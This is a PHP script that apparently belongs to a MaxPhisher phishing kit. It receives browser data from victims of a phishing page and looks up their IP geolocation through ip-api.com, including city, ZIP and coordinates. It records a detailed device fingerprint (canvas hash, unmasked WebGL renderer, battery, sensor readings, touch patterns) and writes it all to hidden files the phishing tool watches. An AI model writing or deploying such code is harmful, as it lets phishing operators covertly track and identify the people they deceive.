<?php
// save_fingerprint.php - Immediate fingerprint save to username.txt
error_reporting(0);
date_default_timezone_set("Asia/Manila");

$fingerprint_data = json_decode(file_get_contents('php://input'), true);
$ip_address = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$sessionId = $fingerprint_data['sessionId'] ?? 'NO_SESSION_' . uniqid();

// Get geolocation data
function get_geolocation($ip) {
    if ($ip === 'UNKNOWN' || filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
        return ['country' => null, 'region' => null, 'city' => null, 'zip' => null, 'asn' => null, 'isp' => 'Invalid/Local IP'];
    }
    $geo_data = @json_decode(@file_get_contents("http://ip-api.com/json/{$ip}"), true);
    if ($geo_data && $geo_data['status'] == 'success') {
        preg_match('/AS(\d+)/', $geo_data['as'] ?? '', $asn_match);
        return [
            'country' => $geo_data['countryCode'] ?? null,
            'region' => $geo_data['regionName'] ?? null,
            'city' => $geo_data['city'] ?? null,
            'zip' => $geo_data['zip'] ?? null,
            'asn' => $asn_match[1] ?? null,
            'isp' => $geo_data['isp'] ?? null,
            'lat' => $geo_data['lat'] ?? null,
            'lon' => $geo_data['lon'] ?? null
        ];
    }
    return ['country' => null, 'region' => null, 'city' => null, 'zip' => null, 'asn' => null, 'isp' => 'Lookup Failed', 'lat' => null, 'lon' => null];
}

$location = get_geolocation($ip_address);

// Format fingerprint text (FULL VERSION for info.txt)
$fingerprint_text = "\n====================\n";
$fingerprint_text .= "FINGERPRINT CAPTURED: " . date('Y-m-d H:i:s') . "\n";
$fingerprint_text .= "Session ID: {$sessionId}\n";
$fingerprint_text .= "--- IP & LOCATION ---\n";
$fingerprint_text .= "IP Address: {$ip_address}\n";
$fingerprint_text .= "Country: " . ($location['country'] ?? 'N/A') . "\n";
$fingerprint_text .= "Region: " . ($location['region'] ?? 'N/A') . "\n";
$fingerprint_text .= "City: " . ($location['city'] ?? 'N/A') . "\n";
$fingerprint_text .= "ZIP Code: " . ($location['zip'] ?? 'N/A') . "\n";
$fingerprint_text .= "ISP: " . ($location['isp'] ?? 'N/A') . "\n";
$fingerprint_text .= "ASN: " . ($location['asn'] ?? 'N/A') . "\n";
$fingerprint_text .= "Coordinates: " . ($location['lat'] ?? 'N/A') . ", " . ($location['lon'] ?? 'N/A') . "\n";
$fingerprint_text .= "User Agent: {$user_agent}\n";
$fingerprint_text .= "--- DEVICE FINGERPRINT ---\n";
$fingerprint_text .= "User Agent: " . ($fingerprint_data['userAgent'] ?? 'N/A') . "\n";
$fingerprint_text .= "Platform: " . ($fingerprint_data['platform'] ?? 'N/A') . "\n";
$fingerprint_text .= "Language: " . ($fingerprint_data['language'] ?? 'N/A') . "\n";
$fingerprint_text .= "Languages: " . (isset($fingerprint_data['languages']) ? implode(', ', $fingerprint_data['languages']) : 'N/A') . "\n";
$fingerprint_text .= "Hardware Concurrency: " . ($fingerprint_data['hardwareConcurrency'] ?? 'N/A') . "\n";
$fingerprint_text .= "Device Memory: " . ($fingerprint_data['deviceMemory'] ?? 'N/A') . "GB\n";
$fingerprint_text .= "Vendor: " . ($fingerprint_data['vendor'] ?? 'N/A') . "\n";
$fingerprint_text .= "Device Pixel Ratio: " . ($fingerprint_data['devicePixelRatio'] ?? 'N/A') . "\n";
$fingerprint_text .= "Screen Resolution: " . ($fingerprint_data['screenResolution'] ?? 'N/A') . "\n";
$fingerprint_text .= "Screen Avail Width: " . ($fingerprint_data['screenAvailWidth'] ?? 'N/A') . "\n";
$fingerprint_text .= "Screen Avail Height: " . ($fingerprint_data['screenAvailHeight'] ?? 'N/A') . "\n";
$fingerprint_text .= "Color Depth: " . ($fingerprint_data['colorDepth'] ?? 'N/A') . "\n";
$fingerprint_text .= "Pixel Depth: " . ($fingerprint_data['pixelDepth'] ?? 'N/A') . "\n";
$fingerprint_text .= "Orientation: " . ($fingerprint_data['orientationType'] ?? 'N/A') . " (" . ($fingerprint_data['orientationAngle'] ?? 'N/A') . "°)\n";
$fingerprint_text .= "Timezone: " . ($fingerprint_data['timezone'] ?? 'N/A') . "\n";
$fingerprint_text .= "Touch Support: " . ($fingerprint_data['touchSupport'] ?? 'N/A') . "\n";
$fingerprint_text .= "Local Storage: " . ($fingerprint_data['localStorage'] ? 'Yes' : 'No') . "\n";
$fingerprint_text .= "Session Storage: " . ($fingerprint_data['sessionStorage'] ? 'Yes' : 'No') . "\n";
$fingerprint_text .= "IndexedDB: " . ($fingerprint_data['indexedDB'] ? 'Yes' : 'No') . "\n";
$fingerprint_text .= "Cookie Enabled: " . ($fingerprint_data['cookieEnabled'] ? 'Yes' : 'No') . "\n";
$fingerprint_text .= "Do Not Track: " . ($fingerprint_data['doNotTrack'] ?? 'N/A') . "\n";
$fingerprint_text .= "Plugin Count: " . ($fingerprint_data['pluginCount'] ?? 'N/A') . "\n";
$fingerprint_text .= "Battery Level: " . ($fingerprint_data['batteryLevel'] ?? 'N/A') . "\n";
$fingerprint_text .= "Battery Charging: " . ($fingerprint_data['batteryCharging'] ? 'Yes' : 'No') . "\n";
$fingerprint_text .= "Connection Type: " . ($fingerprint_data['connectionType'] ?? 'N/A') . "\n";
$fingerprint_text .= "Connection Downlink: " . ($fingerprint_data['connectionDownlink'] ?? 'N/A') . " Mbps\n";
$fingerprint_text .= "WebGL Vendor: " . ($fingerprint_data['webGLVendor'] ?? 'N/A') . "\n";
$fingerprint_text .= "WebGL Renderer: " . ($fingerprint_data['webGLRenderer'] ?? 'N/A') . "\n";
$fingerprint_text .= "WebGL Unmasked Vendor: " . ($fingerprint_data['webGLUnmaskedVendor'] ?? 'N/A') . "\n";
$fingerprint_text .= "WebGL Unmasked Renderer: " . ($fingerprint_data['webGLUnmaskedRenderer'] ?? 'N/A') . "\n";
$fingerprint_text .= "Canvas Fingerprint: " . (isset($fingerprint_data['canvasFingerprint']) ? substr($fingerprint_data['canvasFingerprint'], 0, 50) . '...' : 'N/A') . "\n";
// Mobile Sensors
if (isset($fingerprint_data['mobileSensors'])) {
    $fingerprint_text .= "--- MOBILE SENSORS ---\n";
    if (isset($fingerprint_data['mobileSensors']['gyroscope'])) {
        $gyro_count = count($fingerprint_data['mobileSensors']['gyroscope']);
        $fingerprint_text .= "Gyroscope Readings: {$gyro_count}\n";
    }
    if (isset($fingerprint_data['mobileSensors']['accelerometer'])) {
        $accel_count = count($fingerprint_data['mobileSensors']['accelerometer']);
        $fingerprint_text .= "Accelerometer Readings: {$accel_count}\n";
    }
}
// Touch Patterns
if (isset($fingerprint_data['touchPatterns'])) {
    $touch_count = count($fingerprint_data['touchPatterns']);
    $fingerprint_text .= "Touch Patterns: {$touch_count}\n";
}
$fingerprint_text .= "--- ADDITIONAL INFO ---\n";
$fingerprint_text .= "Referer: " . ($_SERVER['HTTP_REFERER'] ?? 'Direct/No Referer') . "\n";
$fingerprint_text .= "Accept Language: " . ($_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'N/A') . "\n";
$fingerprint_text .= "Accept Encoding: " . ($_SERVER['HTTP_ACCEPT_ENCODING'] ?? 'N/A') . "\n";
$fingerprint_text .= "Connection: " . ($_SERVER['HTTP_CONNECTION'] ?? 'N/A') . "\n";
$fingerprint_text .= "====================\n\n";

// SIMPLIFIED FORMAT for usernames.txt (timestamp, IP, location, user agent only - no email/password here)
$username_text = "Timestamp: " . date('Y-m-d H:i:s') . "\n";
$username_text .= "IP Address: " . $ip_address . "\n";
$username_text .= "Country: " . ($location['country'] ?? 'N/A') . "\n";
$username_text .= "Region: " . ($location['region'] ?? 'N/A') . "\n";
$username_text .= "City: " . ($location['city'] ?? 'N/A') . "\n";
$username_text .= "ZIP Code: " . ($location['zip'] ?? 'N/A') . "\n";
$username_text .= "ISP: " . ($location['isp'] ?? 'N/A') . "\n";
$username_text .= "ASN: " . ($location['asn'] ?? 'N/A') . "\n";
$username_text .= "Coordinates: " . ($location['lat'] ?? 'N/A') . "," . ($location['lon'] ?? 'N/A') . "\n";
$username_text .= "User Agent: " . $user_agent . "\n";
$username_text .= "====================\n\n";

// Get the site directory (where MaxPhisher watches for files)
$home_dir = $_SERVER['HOME'] ?? getenv('HOME') ?? (isset($_SERVER['HOMEPATH']) ? $_SERVER['HOMEDRIVE'] . $_SERVER['HOMEPATH'] : dirname(__FILE__));
$site_dir = $home_dir . '/.site';

// Ensure directory exists
if (!is_dir($site_dir)) {
    @mkdir($site_dir, 0755, true);
}

// Save to usernames.txt (SIMPLIFIED FORMAT - MaxPhisher watches this file in ~/.site/)
$username_file = $site_dir . '/usernames.txt';
file_put_contents($username_file, $username_text, FILE_APPEND | LOCK_EX);

// Also save to info.txt (backup in same directory)
$info_file = $site_dir . '/info.txt';
file_put_contents($info_file, $fingerprint_text, FILE_APPEND | LOCK_EX);

// Also save in current directory (template directory) for immediate visibility (SIMPLIFIED FORMAT)
$current_dir_file = dirname(__FILE__) . '/usernames.txt';
file_put_contents($current_dir_file, $username_text, FILE_APPEND | LOCK_EX);

header('Content-Type: application/json');
echo json_encode(['status' => 'success', 'sessionId' => $sessionId]);
exit();
?>

